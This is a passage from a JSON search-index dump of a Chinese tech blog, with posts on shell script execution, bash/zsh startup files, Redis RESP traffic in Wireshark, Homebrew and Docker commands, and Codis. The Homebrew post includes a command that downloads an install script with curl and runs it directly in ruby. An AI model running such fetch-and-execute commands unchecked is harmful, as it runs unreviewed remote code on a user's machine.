硬中断（Hardware IRQ）占用CPU的百分比 si — 软中断（Software Interrupts）占用CPU的百分比 htopmacOS 1$ brew install htop Ubuntu 1$ sudo apt-get install htop","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】shell 和 shell 脚本的执行","date":"2020-06-13T08:26:15.000Z","path":"2020/06/13/【Linux】shell和shell脚本的执行/","text":"fork - 创建子 shell 进程父子 shell 进程是相对而言的，它描述了两个 shell 进程的fork关系。 以bash为例，当在bash shell中执行一个命令时，其实是在当前 bash shell 进程中 fork 出一个子 bash shell 进程，然后在这个子进程中运行相应的命令，当命令执行完成后，这个子进程就被end了。 简单来说，父Shell进程创建子Shell进程时，调用的是fork函数。 在这种情况中： 子 shell 进程会继承父 shell 进程中设置的环境变量 但是子 shell 进程中设置的环境变量并不会带回父 shell 进程（即不会影响父 shell 进程） Case 1 - shell 中执行命令我们可以做一个实验来验证这个事实： 123$ echo $$84289$ sleep 500 当然我用的是zsh啦，当前 zsh shell 的 PID 为 84289。我们执行 sleep 500 ，它在 PID 为 84408 的子 zsh shell 中执行。 注意到，它的父进程PID 为84289 Case 2 - shell 中执行 shell 脚本这是一个简单的bash shell脚本（test.sh）： 12#!/bin/bashsleep 100 我们执行这个脚本： 12345678$ echo $$84289$ ./test.sh# 以上执行方法和以下执行方法完全等效（从进行 fork 操作的角度来说），只是前者用 bash 这种 shell 来执行，而后者用 sh 这种 shell 罢了$ bash ./test.sh# or$ sh ./test.sh bash ./test.sh在另一个终端执行 ps -f： 可以看到： 终端的bash shell 进程（进程ID是84289）fork 创建出一个用于执行 test.sh 的新子进程（PID是84616）。 当执行到 sleep 命令时， bash ./test.sh 这个进程会通过 fork 产生了一个新 sleep 子进程用于这个sleep 命令（PID为 84617）。 sh ./test.sh 或者，用htop（更加直观）： 可以看到，这时，shell 脚本的中内容会通过当前 shell 进程（PID 为 22804） fork 出一个子 shell 进程（PID 为 28392）来执行。 不同 shell 脚本执行方式对文件权限的要求123456789101112131415161718192021# 当 shell 脚本没有任何权限时，三种方式均不能执行这个 shell 脚本$ chmod 000 test.sh$ ll-r--r--r--@ 1 wei.shi 345931250 46B Jun 13 18:27 test.sh$ ./test.shzsh: permission denied: ./test.sh$ source ./test.shsource: permission denied: ./test.sh$ bash ./test.shbash: ./test.sh: Permission denied# 当 shell 脚本只有可读权限时，./test.sh 方式不能执行这个 shell 脚本$ chmod 444 test.sh$ ll-r--r--r--@ 1 wei.shi 345931250 46B Jun 13 18:27 test.sh$ ./test.shzsh: permission denied: ./test.sh$ bash ./test.sh...$ sh ./test.sh... source &lt;script&gt; - 执行 shell 脚本Case 1 - source &lt;script&gt; 执行 shell 脚本在上面的实验中，我们发现通过 source &lt;script&gt; 的方式来执行 shell 脚本，只需要当前用户对该 shell 脚本文件有可读权限时，即可成功执行该脚本。 我们继续来看看，这种执行方法与其他几种执行方式还有什么区别 123$ echo $$22804$ source ./test.sh 在另一个终端执行 ps -f： 可以看到，这时，shell 脚本的中内容会在当前 shell 进程（PID 为 22804） 中直接执行。 值得一提的是，以下两种表达是完全等效的： 123$ source ./test.sh$ . ./test.sh man source是这样解释的： 123. filename [arguments]source filename [arguments] Read and execute commands from filename in the current shell environment and return the exit status of the last command executed from filename. If filename does not contain a slash, file names in PATH are used to find the directory containing filename. The file searched for in PATH need not be executable. When bash is not in posix mode, the current directory is searched if no file is found in PATH. If the sourcepath option to the shopt builtin command is turned off, the PATH is not searched. If any arguments are supplied, they become the positional parameters when filename is executed. Otherwise the positional parameters are unchanged. The return status is the status of the last command exited within the script (0 if no commands are executed), and false if filename is not found or cannot be read. 通常，我们在修改了 bash 或 zsh 的启动脚本 （如 .zshrc，.bash_profile），比如增加一个环境变量的设置，都要 source 一下这个启动脚本，目的其实是使这个新设置的环境变量在当前 shell process 中立即生效。 不同 shell 脚本执行方式对环境变量的影响123456789101112$ echo $SW_TEST$ echo `export SW_TEST=\"aaabbb\"` &gt; ./test.sh$ bash ./test.sh$ echo $SW_TEST$ sh ./test.sh$ echo $SW_TEST# 只有通过这种方式执行，在 shell script 中修改的环境变量才会对当前 shell 有影响作用（作用范围）$ source ./test.sh$ echo $SW_TESTaaabbb 这其实是因为，使用 source 方式运行 script 时， 就是让 script 在当前 shell process内执行， 而不是创建一个新的 child process 来执行。 而由于所有 shell 脚本中的所有命令均在当前 shell process中执行，在 shell 脚本中进行的对环境变量的修改， 当然就会改变当前process环境了。 exec &lt;script&gt; - 执行 shell 脚本exec 与 source 类似的一点在于，他们均在当前 shell 进程中执行 shell 脚本（而不是专门创建一个 child process 去执行该script）。 唯一的一点区别在于，使用 exec 执行时，当该 shell 脚本执行完成后，当前shell 进程也就退出了。 总结我们可以使用 fork、source 或者 exec 中任何一种方式来执行 shell 脚本： fork 使用 fork 方式运行 script 时， 当前 shell 进程会创建一个 child process 去专门执行该script，当child process结束后（意味着这个script 执行完成），会返回parent process，但 parent process 的环境是不会因 child process 的改变而改变。 这意味着在 shell 脚本中进行的对环境变量的修改并不会在当前 shell 中生效。 source 使用 source 方式运行 script 时， 就是让 script 在当前 shell process内执行， 而不是创建一个child process来执行。 而由于所有 shell 脚本中的所有命令均在当前 shell process中执行，在 shell 脚本中进行的对环境变量的修改， 当然就会改变当前process环境了。 exec 与 source 类似，使用 exec 方式运行 script 时， 就是让 script 在当前 shell process 内执行（而不是创建一个child process来执行），而 script 执行结束后，当前 shell process 也就被结束了。","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】Shell 和 Bash","date":"2020-06-13T08:18:33.000Z","path":"2020/06/13/【Linux】Shell-和-Bash/","text":"Unix shellUnix shell，一种壳层与命令行界面，是UNIX操作系统下传统的用户和计算机的交互界面。第一个用户直接输入命令来执行各种各样的任务。 普通意义上的shell就是可以接受用户输入命令的程序。它之所以被称作shell是因为它隐藏了操作系统低层的细节。同样的Unix下的图形用户界面GNOME和KDE，有时也被叫做“虚拟shell”或“图形shell”。 这是基本的一个输出声音所需要的步骤！ 也就是说，你必须要『输入』一个命令之后， 『硬件』才会透过你下达的命令来工作！那么硬件如何知道你下达的命令呢？那就是 kernel (核心) 的控制工作了！也就是说，我们必须要透过『 Shell 』将我们输入的命令与 Kernel 沟通，好让 Kernel 可以控制硬件来正确无误的工作！ 基本上，我们可以透过底下这张图来说明一下： 各种Unix shell第一个Unix shell是由肯·汤普逊，仿效Multics上的shell所实现出来，称为sh。 由于早年的 Unix 年代，发展者众，所以由于 shell 依据发展者的不同就有许多的版本，例如常听到的 Bourne SHell (sh) 、在 Sun 里头默认的 C SHell、 商业上常用的 K SHell、, 还有 TCSH 等等，每一种 Shell 都各有其特点。至于 Linux 使用的这一种版本就称为『 Bourne Again SHell (简称 bash) 』，这个 Shell 是 Bourne Shell 的增强版本，也是基准于 GNU 的架构下发展出来的呦！ 迭代关系： Bourne shell兼容 Bourne shell（sh）史蒂夫·伯恩在贝尔实验室时编写。1978年随Version 7 Unix首次发布。 Almquist shell（ash） Bourne-Again shell（bash） Debian Almquist shell（dash） Korn shell（ksh）David Korn在贝尔实验室时编写。 Z shell（zsh） C shell兼容 C shell（csh）比尔·乔伊在加州大学伯克利分校时编写。1979年随BSD首次发布 那么目前我们的 Linux 有多少我们可以使用的 shells 呢？ 你可以检查一下 /etc/shells 这个文件，至少就有底下这几个可以用的 shells： /bin/sh (已经被 /bin/bash 所取代) /bin/bash (就是 Linux 默认的 shell) /bin/ksh (Kornshell 由 AT&amp;T Bell lab. 发展出来的，兼容于 bash) /bin/tcsh (整合 C Shell ，提供更多的功能) /bin/csh (已经被 /bin/tcsh 所取代) /bin/zsh (基于 ksh 发展出来的，功能更强大的 shell) BashBash，Unix shell的一种，在1987年由布莱恩·福克斯为了GNU计划而编写。1989年发布第一个正式版本，原先是计划用在GNU操作系统上，但能运行于大多数类Unix系统的操作系统之上，包括Linux与Mac OS X v10.4都将它作为默认shell。 Bash是Bourne shell的后继兼容版本与开放源代码版本，它的名称来自Bourne shell（sh）的一个双关语（Bourne again / born again）：Bourne-Again SHell。 Bash是一个命令处理器，通常运行于文本窗口中，并能执行用户直接输入的命令。Bash还能从文件中读取命令，这样的文件称为脚本。和其他Unix shell 一样，它支持文件名替换（通配符匹配）、管道、here文档、命令替换、变量，以及条件判断和循环遍历的结构控制语句。包括关键字、语法在内的基本特性全部是从sh借鉴过来的。其他特性，例如历史命令，是从csh和ksh借鉴而来。总的来说，Bash虽然是一个满足POSIX规范的shell，但有很多扩展。 Reference https://zh.wikipedia.org/wiki/Unix_shell http://cn.linux.vbird.org/linux_basic/0320bash.php","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】bash 和 zsh 的启动脚本（.zshrc，.bash_profile，~/.profile 等区别）","date":"2020-06-13T08:15:10.000Z","path":"2020/06/13/【Linux】bash-和-zsh-的启动脚本/","text":"结论zsh当默认 shell 为 zsh 时，且当开启一个新 tab 时（或者一台主机通过 SSH 登录本主机时），/etc/zprofile 、/etc/zshrc 和 ~/.zshrc 均会被执行 ，且执行顺序为： /etc/zprofile /etc/zshrc ~/.zshrc 当开启一个新 tab 时， 1234Last login: Sat Jun 13 11:46:23 on ttys006execute /etc/zprofileexecute /etc/zshrcexecute ~/.zshrc 当一台主机通过 SSH 登录本主机时 123456$ ssh wei.shi@192.168.16.173Last login: Sat Jun 13 11:54:43 2020execute /etc/zprofileexecute /etc/zshrcexecute ~/.zshrc~ $ 当启用一个新zsh 进程时 1234$ zshexecute /etc/zshrcexecute ~/.zshrc$ bash当默认 shell 为 bash 时，且当开启一个新 tab 时（或者一台主机通过 SSH 登录本主机时），以下文件的内容会有意义，且执行顺序为： /etc/bashrc /etc/profile - 全局profile文件 以下三个文件，三选一执行（只会执行最多一个文件），执行顺序从高到低 ~/.bash_profile ~/.bash_login ~/.profile 当启动一个新 bash 进程时，以下文件会被执行 ~/.bashrc 当开启一个新 tab 时（或者一台主机通过 SSH 登录本主机时）， 1234Last login: Sat Jun 13 12:06:35 from 192.168.16.227execute /etc/bashrcexecute /etc/profileexecute ~/.bash_profile 当一台主机通过 SSH 登录本主机时 12345ssh wei.shi@192.168.16.173Last login: Sat Jun 13 12:04:54 2020execute /etc/bashrcexecute /etc/profileexecute ~/.bash_profile 当启动一个新 bash 进程时 123$ bashexecute ~/.bashrcbash-3.2$ 如果算作 Login ShellTypically, most users will encounter a login shell only if either: they logged in from a tty, not through a GUI they logged in remotely, such as through ssh. If the shell was started any other way, such as through GNOME’s gnome-terminal or KDE’s konsole, then it is typically not a login shell — the login shell was what started GNOME or KDE behind your back when you logged in; things started anew are not login shells. New terminals or new screen windows you open are not login shells either. (However, starting a new window in OS X’s Terminal.app or iTerm2 counts as a login shell) 使用 zsh12# 设置默认 shell 为 zsh$ chsh -s /bin/zsh /etc/zprofile /etc/zshrc ~/.zshrc For zsh: [Note that zsh seems to read ~/.profile as well, if ~/.zshrc is not present.] 12345678910111213141516171819202122232425262728+----------------+-----------+-----------+------+| |Interactive|Interactive|Script|| |login |non-login | |+----------------+-----------+-----------+------+|/etc/zshenv | A | A | A |+----------------+-----------+-----------+------+|~/.zshenv | B | B | B |+----------------+-----------+-----------+------+|/etc/zprofile | C | | |+----------------+-----------+-----------+------+|~/.zprofile | D | | |+----------------+-----------+-----------+------+|/etc/zshrc | E | C | |+----------------+-----------+-----------+------+|~/.zshrc | F | D | |+----------------+-----------+-----------+------+|/etc/zlogin | G | | |+----------------+-----------+-----------+------+|~/.zlogin | H | | |+----------------+-----------+-----------+------+| | | | |+----------------+-----------+-----------+------+| | | | |+----------------+-----------+-----------+------+|~/.zlogout | I | | |+----------------+-----------+-----------+------+|/etc/zlogout | J | | |+----------------+-----------+-----------+------+ 实验当开启一个新 tab 时， 1234Last login: Sat Jun 13 11:46:23 on ttys006execute /etc/zprofileexecute /etc/zshrcexecute ~/.zshrc 当一台主机通过 SSH 登录本主机时 123456$ ssh wei.shi@192.168.16.173Last login: Sat Jun 13 11:54:43 2020execute /etc/zprofileexecute /etc/zshrcexecute ~/.zshrc~ $ 当启用一个新zsh 进程时 1234$ zshexecute /etc/zshrcexecute ~/.zshrc$ 结论： 当开启一个新 tab 时（或者一台主机通过 SSH 登录本主机时）/etc/zprofile 、/etc/zshrc 和 ~/.zshrc 均会被执行 ，且执行顺序为： /etc/zprofile /etc/zshrc ~/.zshrc 使用 bash12# 设置默认 shell 为 bash$ chsh -s /bin/bash /etc/bashrc /etc/profile - 全局初始化，当新建一个 Shell tab ，或者每次 SSH 到远程主机，或者等次登录 Shell 时，会被执行（The systemwide initialization file, executed for login shells） 当新建一个 Shell tab ，或者每次 SSH 到本主机，或者每次登录 Shell 时（The systemwide initialization file, executed for login shells）以下三个文件，三选一执行（只会执行最多一个文件），执行顺序从高到低 ~/.bash_profile ~/.bash_login ~/.profile ~/.bashrc （当新建一个 Shell tab ，或者每次 SSH 到远程主机，或者等次登录 Shell 时，该文件不会被执行） /home/username/.profile 或 /home/username/.bash_profile 是针对特定用户的。也就是说，当当前登录身份为这个用户时，这个用户中 ~/.profile 和 ~/.bash_profile 文件会被执行。 而 /etc/profile 和 /etc/bashrc 是全局设置（并不针对特定用户），这意味着：不管使用任何一个用户登录，/etc/profile 和 /etc/bashrc 中的文件内容都会被执行。 实验当开启一个新 tab 时（或者一台主机通过 SSH 登录本主机时）， 1234Last login: Sat Jun 13 12:06:35 from 192.168.16.227execute /etc/bashrcexecute /etc/profileexecute ~/.bash_profile 当一台主机通过 SSH 登录本主机时 12345ssh wei.shi@192.168.16.173Last login: Sat Jun 13 12:04:54 2020execute /etc/bashrcexecute /etc/profileexecute ~/.bash_profile 当启用一个新 bash 进程时 123$ bashexecute ~/.bashrcbash-3.2$ 结论： 当开启一个新 tab 时（或者一台主机通过 SSH 登录本主机时）/etc/bashrc 、/etc/profile 和 ~/.bash_profile 均会被执行 ，且执行顺序为： /etc/bashrc /etc/profile - 全局初始化，当新建一个 Shell tab ，或者每次 SSH 到远程主机，或者等次登录 Shell 时，会被执行（The systemwide initialization file, executed for login shells） 当新建一个 Shell tab ，或者每次 SSH 到本主机，或者每次登录 Shell 时（The systemwide initialization file, executed for login shells）以下三个文件，三选一执行（只会执行最多一个文件），执行顺序从高到低 ~/.bash_profile ~/.bash_login ~/.profile ~/.bashrc（当新建一个 Shell tab ，或者每次 SSH 到远程主机，或者等次登录 Shell 时，该文件不会被执行） Reference https://medium.com/@rajsek/zsh-bash-startup-files-loading-order-bashrc-zshrc-etc-e30045652f2e https://www.jianshu.com/p/b39fd35e2360 https://medium.com/@rajsek/zsh-bash-startup-files-loading-order-bashrc-zshrc-etc-e30045652f2e http://www.solipsys.co.uk/new/BashInitialisationFiles.html","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Golang】go-redis Redis 连接库学习","date":"2020-05-24T09:26:08.000Z","path":"2020/05/24/【Golang】go-redis-Redis-连接库学习/","text":"","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Redis】Wireshark 分析 Redis 通讯","date":"2020-05-24T08:02:10.000Z","path":"2020/05/24/【Redis】Wireshark-分析-Redis-通讯/","text":"BackgroundRedis client与Redis server在默认情况下的通讯，是不加密的。而且他们之间的通讯基于TCP。 因此，我们可以通过Wireshark来获取它们之间的通讯内容。 Redis server: 192.168.184:6379 Redis client: 192.168.31.169 Experiment当client在设置一个key后： 12192.168.31.184:6379&gt; set sw_test_key4 sw_test_value4OK client （192.168.31.169） 向 server（192.168.184）发送一个TCP包（序号为762）： 随后，server返回 +OK，并附上ACK flag（表示上一个client发过来的TCP包收到了），对应序号为831的包： client再发送一个包含ACK flag的TCP 包，以表示自己收到了刚才的831包。 至此，整个通讯过程结束。 RESP（REdis Serialization Protocol）Redis使用 RESP（REdis Serialization Protocol）协议进行通讯。 这意味着，client需要将一个操作序列化成byte[]（在上面的例子中，TCP包（序号为762）中的body内容，就是将上面的set操作序列化后的byte[]）。 Data TypesIn RESP, the type of some data depends on the first byte: For Simple Strings the first byte of the reply is “+” For Errors the first byte of the reply is “-“ For Integers the first byte of the reply is “:” For Bulk Strings the first byte of the reply is “$” For Arrays the first byte of the reply is “*“ RESP ArraysRESP Arrays are sent using the following format: A * character as the first byte, followed by the number of elements in the array as a decimal number, followed by CRLF. An additional RESP type for every element of the Array. So an empty Array is just the following: 1&quot;*0\\r\\n&quot; While an array of two RESP Bulk Strings “foo” and “bar” is encoded as: 1&quot;*2\\r\\n$3\\r\\nfoo\\r\\n$3\\r\\nbar\\r\\n&quot; As you can see after the *CRLF part prefixing the array, the other data types composing the array are just concatenated one after the other. For example an Array of three integers is encoded as follows: 1&quot;*3\\r\\n:1\\r\\n:2\\r\\n:3\\r\\n&quot; RESP Bulk StringsBulk Strings are used in order to represent a single binary safe string up to 512 MB in length. Bulk Strings are encoded in the following way: A “$” byte followed by the number of bytes composing the string (a prefixed length), terminated by CRLF. The actual string data. A final CRLF. So the string “foobar” is encoded as follows: 1&quot;$6\\r\\nfoobar\\r\\n&quot; When an empty string is just: 1&quot;$0\\r\\n\\r\\n&quot; RESP Bulk Strings can also be used in order to signal non-existence of a value using a special format that is used to represent a Null value. In this special format the length is -1, and there is no data, so a Null is represented as: 1&quot;$-1\\r\\n&quot; This is called a Null Bulk String. The client library API should not return an empty string, but a nil object, when the server replies with a Null Bulk String. For example a Ruby library should return ‘nil’ while a C library should return NULL (or set a special flag in the reply object), and so forth. Sending commands to a Redis ServerA client sends the Redis server a RESP Array consisting of just Bulk Strings. 我们把上面的TCP包（序号为762）中的body内容使用ASCII解码，这可以让我们更直观的了解RESP： 因为client发给server的总是一个RESP Array，因此上面的第一个字符是 *，3表示这个RESP Array有3个元素。 1234567891011121314# 这是一个RESP Array，共有3个元素*3 # 下面是一个 RESP Bulk Strings，字节长度为3$3 set # 下面是一个 RESP Bulk Strings，字节长度为12$12 sw_test_key4 # 下面是一个 RESP Bulk Strings，字节长度为12$14 sw_test_value4 Sending a command‘s answer to a Redis Client12192.168.31.184:6379&gt; get sw_test_key4\"sw_test_value4\" server的返回内容： 其实也和上面的例子类似： 123# $表示这是一个Bulk Strings，长度为12个byte[]$14 sw_test_value4 如果我们读取一个包含中文的value，中文会被UTF-8编码： 1234192.168.31.184:6379&gt; set sw_test_key5 测试OK192.168.31.184:6379&gt; get sw_test_key5\"\\xe6\\xb5\\x8b\\xe8\\xaf\\x95\" Reference https://redis.io/topics/protocol","comments":true,"categories":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Docker】Docker Compose","date":"2020-05-24T07:15:32.000Z","path":"2020/05/24/【Docker】Docker-Compose/","text":"","comments":true,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://swsmile.info/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://swsmile.info/tags/Docker/"}]},{"title":"【macOS】brew 使用","date":"2020-05-24T06:49:20.000Z","path":"2020/05/24/【macOS】brew-使用/","text":"HomebrewHomebrew是一个包管理器，用于安装Apple没有预装但你需要的UNIX工具。（比如著名的wget）。 Homebrew会将软件包安装到独立目录(/usr/local/Cellar)，并将其文件软链接至/usr/local。 Installation安装Homebrew。将以下命令粘贴至终端 1/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\" 脚本会在执行前暂停，并说明将它将做什么。 Usage1234567891011121314151617181920212223Example usage: brew search [TEXT|/REGEX/] brew info [FORMULA...] brew install FORMULA... brew update brew upgrade [FORMULA...] brew uninstall FORMULA... brew list [FORMULA...]Troubleshooting: brew config brew doctor brew install --verbose --debug FORMULAContributing: brew create [URL [--no-fetch]] brew edit [FORMULA...]Further help: brew commands brew help [COMMAND] man brew https://docs.brew.sh 安装包 - brew install1234$ brew install FORMULA... # 安装包$ brew install mysql 查看包信息 - brew info1234$ brew info [FORMULA...]# 查看包信息，比如目前的版本，依赖，安装后注意事项等$ brew info mysql 查看已安装包 - brew list123456789101112131415161718192021$ brew list [FORMULA...]# 显示已安装的所有包$ brew list# 查看一个特定的包是否已经安装$ brew list gError: No such keg: /usr/local/Cellar/g$ brew list go/usr/local/Cellar/go/1.14.2_1/bin/go/usr/local/Cellar/go/1.14.2_1/bin/godoc/usr/local/Cellar/go/1.14.2_1/bin/gofmt/usr/local/Cellar/go/1.14.2_1/libexec/api/ (18 files)/usr/local/Cellar/go/1.14.2_1/libexec/bin/ (3 files)/usr/local/Cellar/go/1.14.2_1/libexec/doc/ (147 files)/usr/local/Cellar/go/1.14.2_1/libexec/lib/ (3 files)/usr/local/Cellar/go/1.14.2_1/libexec/misc/ (340 files)/usr/local/Cellar/go/1.14.2_1/libexec/pkg/ (592 files)/usr/local/Cellar/go/1.14.2_1/libexec/src/ (6125 files)/usr/local/Cellar/go/1.14.2_1/libexec/test/ (2197 files)/usr/local/Cellar/go/1.14.2_1/libexec/ (7 files) 卸载包 - brew uninstall1234$ brew uninstall FORMULA...// 卸载包$ brew uninstall wget 搜索一个特定的包 - brew search1234567$ brew search [TEXT|/REGEX/]$ brew search gradle==&gt; Formulaegradle gradle-completion==&gt; Casksqlgradle 升级软件1234567891011# 自动升级homebrew（从github下载最新版本）$ brew update # 列出当前可以升级的软件$ brew outdated # 升级所有已过时的软件，即当前所有已经安装的且已过时软件$ brew upgrade # 升级指定的软件$ brew upgrade &lt;formula&gt; 清理相关 - brew cleanuphomebrew再升级软件时候不会清理相关的旧版本，在软件升级后我们可以使用如下命令清理 12345678# 列出需要清理的内容$ brew cleanup -n# 清理指定的软件过时包$ brew cleanup &lt;package name&gt;# 清理所有的过时软件$ brew cleanup 管理后台软件 - brew services诸如 Nginx、MySQL 等软件，都是有一些服务端软件在后台运行，如果你希望对这些软件进行管理，可以使用 brew services 命令来进行管理 1234567891011121314# 查看所有服务$ brew services list# 单次运行某个服务$ brew services run [服务名]# 运行某个服务，并设置开机自动运行$ brew services start [服务名]# 停止某个服务$ brew services stop [服务名]# ：重启某个服务$ brew services restart 扩展：Homebrew Cask你已经感受到了使用Homebrew安装命令行程序的便利。那么接下来，我们将通过Homebrew Cask优雅、简单、快速的安装和管理OS X图形界面程序，比如Google Chrome和Dropbox。 使用基本用法与brew相同，只不过在brew后面加了一个cask单词。 12345// 安装软件brew cask install google-chrome// 卸载软件brew cask uninstall google-chrome Reference https://docs.brew.sh/ https://www.jianshu.com/p/bca8fc1ff3f0 https://juejin.im/post/5a559b9f6fb9a01cba42772f https://sspai.com/post/56009","comments":true,"categories":[{"name":"macOS","slug":"macOS","permalink":"http://swsmile.info/categories/macOS/"}],"tags":[{"name":"macOS","slug":"macOS","permalink":"http://swsmile.info/tags/macOS/"}]},{"title":"【Docker】Docker 常用命令","date":"2020-05-23T12:17:40.000Z","path":"2020/05/23/【Docker】Docker-常用命令/","text":"镜像管理12345678# 查看当前本机有的镜像$ docker image ls# 将 image 文件从仓库抓取到本地$ docker image pull library/hello-world# 删除镜像$ docker rmi &lt;image id&gt; 容器管理查看当前容器123456# 查看当前运行的容器docker ps# 查看全部容器（包括曾经运行，但现在已经被停止的）docker ps -a# 列出本机正在运行的容器：$ docker container ls 创建/启动容器docker run / docker container rundocker run命令是新建并启动容器，每运行一次，就会新建一个容器。同样的命令运行两次，就会生成两个一模一样的容器文件 1$ docker run [OPTIONS] IMAGE [COMMAND] [ARG...] 比如， 12# 创建一个容器，并在创建完成后，终止它$ docker run ubuntu bash docker run命令具有自动抓取 image 文件的功能。如果发现本地没有指定的 image 文件，就会从仓库自动抓取。因此，前面的docker image pull命令并不是必需的步骤。 12# 下面命令，生成并启动了Ubuntu 的 image（的实例），并在控制台输出“Hello”，最后终止这个Ubuntu容器实例$ docker container run ubuntu /bin/echo \"Hello\" -it - 交互模式如果我们希望新建并启动一个Ubuntu容器实例，并将当前控制台作为这个实例的控制台。并在这个实例中输入cat /proc/version和ls以分别查看当前系统版本信息和当前目录下文件列表 1$ docker container run -it ubuntu /bin/bash 12# 创建并启动一个容器，名为 test ，基于镜像 ubuntu$ docker run --name test ubuntu -d - Run container in background and print container ID12# 使用镜像nginx:latest，并以后台模式启动一个容器$ docker run -d nginx:latest -P - Publish all exposed ports to random ports12# 使用镜像nginx:latest，并以后台模式启动一个容器$ docker run -P nginx:latest -p list - 端口映射12# 使用镜像 nginx:latest 启动一个容器，将容器的 80 端口映射到主机的 80 端口$ docker run -p 80:80 nginx:latest -v list - Bind mount a volume12# 使用镜像 nginx:latest 启动一个容器，将主机的目录 /data 映射到容器的 /data$ docker run -v /data:/data nginx:latest docker container startdocker container run命令是新建并启动容器，每运行一次，就会新建一个容器。同样的命令运行两次，就会生成两个一模一样的容器文件。如果希望重复使用容器，就要使用docker container start命令，它用来启动已经生成、已经停止运行的容器文件。 1$ docker start [containerID] 以交互模式启动（以当前bash作为该容器的bash） 1$ docker start -i [containerID] 删除容器12# 删除一个或多个容器。$ docker rm [OPTIONS] containID [containID...] 停止容器对于那些不会自动终止的容器，必须使用手动终止。 12345# 杀掉一个运行中的容器$ dokcer kill containID [containID...] # 或者也可以使用$ docker stop [containID] 两者的区别是：docker container kill命令终止容器运行，相当于向容器里面的主进程发出 SIGKILL 信号。而docker container stop命令也是用来终止容器运行，相当于向容器里面的主进程发出 SIGTERM 信号，然后过一段时间再发出 SIGKILL 信号。 应用程序收到 SIGTERM 信号以后，可以自行进行收尾清理工作，但也可以不理会这个信号。如果收到 SIGKILL 信号，就会强行立即终止，那些正在进行中的操作会全部丢失。 总结一句，docker container kill可以理解为强制结束容器（丢失全部正在进行的操作），而docker container stop会在保存完所有正在进行的操作后，再结束容器。 在容器中执行命令docker container exec / docker execdocker container exec 命令用于进入一个正在运行的 docker 容器，并执行一个命令。 1234$ docker container exec -it [containerID] pwd$ docker container exec 4acf9613dfa5 pwd/var/www/html 因为，如果docker run命令运行容器的时候，没有使用-it参数。如果希望进入容器，就可以使用这个命令。 如果进入了容器，就可以在容器的 Shell 执行命令了。 文件管理上传文件1$ docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH 比如，docker cp /root/test.txt ecef8319d2c8:/root/的意思是将当前操作系统（CentOS）家目录（root）下的文件test.txt拷贝到容器id为ecef8319d2c8的家目录（root）文件夹下。 下载文件1$ docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH 比如docker cp ecef8319d2c8:/root/test.txt /root/ 共享文件在Docker和宿主机之间共享文件： 1$ docker run -it -v [宿主机文件夹]:[Dokcer中的目标文件夹] [image源] /bin/bash 比如docker run -it -v /Users/weishi/Downloads/:/share ubuntu /bin/bash，就将宿主机下的/Users/weishi/Downloads/关联到Docker容器中的/share了。 资源使用管理查看docker容器CPU、内存、网络使用情况 1$ docker stats 查看docker镜像和容器磁盘使用情况 1$ docker system df 网络管理网络端口映射Docker网络端口映射使得通过访问宿主机器上的某个端口，可以访问到某个Docker容器上的端口。这样Docker容器就可以对外提供服务了。 查看某个容器的端口映射情况 1$ docker port [containerId]","comments":true,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://swsmile.info/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://swsmile.info/tags/Docker/"}]},{"title":"【Redis】Codis","date":"2020-05-12T14:01:31.000Z","path":"2020/05/12/【Redis】Codis/","text":"CodisCodis 是一个分布式 Redis 解决方案， 对于上层的应用来说， 连接到 Codis Proxy 和连接原生的 Redis Server 没有显著区别 (不支持的命令列表)， 上层应用可以像使用单机的 Redis 一样使用， Codis 内部（其实是Codis Proxy）会处理请求的转发（转发到Codis Server）， 不停机的数据迁移等工作， 所有后边的一切事情， 对于前面的客户端来说是透明的， 可以简单的认为后边连接的是一个内存无限大的 Redis 服务。 Architecture ComponentsCodis 3.x 由以下组件组成： Codis Server（Codis-server）：基于 redis-3.2.8 分支开发。增加了额外的数据结构，以支持 slot 有关的操作以及数据迁移指令。具体的修改可以参考文档 redis 的修改。 Codis Proxy（Codis-proxy）：客户端连接的 Redis 代理服务， 实现了 Redis 协议。 除部分命令不支持以外(不支持的命令列表)，表现的和原生的 Redis 没有区别（就像 Twemproxy）。 对于同一个业务集群而言，可以同时部署多个 Codis-proxy 实例； 不同 Codis-proxy 之间由 Codis-dashboard 保证状态同步。 Codis Dashboard（Codis-config）：Codis 集群的管理工具，支持 Codis-proxy、Codis-server 的添加、删除，以及据迁移等操作。在集群状态发生改变时，Codis-dashboard 维护集群下所有 Codis-proxy 的状态的一致性。 对于同一个业务集群而言，同一个时刻 Codis-dashboard 只能有 0个或者1个； 所有对集群的修改都必须通过 Codis-dashboard 完成。 Codis-config 本身还自带了一个 http server，会启动一个 dashboard，用户可以直接在浏览器上观察 Codis 集群的运行状态； Codis Admin：集群管理的命令行工具。 可用于控制 Codis-proxy、Codis-dashboard 状态以及访问外部存储。 Codis FE：集群管理界面。 多个集群实例共享可以共享同一个前端展示页面； 通过配置文件管理后端 Codis-dashboard 列表，配置文件可自动更新。 Storage：为集群状态提供外部存储。 提供 Namespace 概念，不同集群的会按照不同 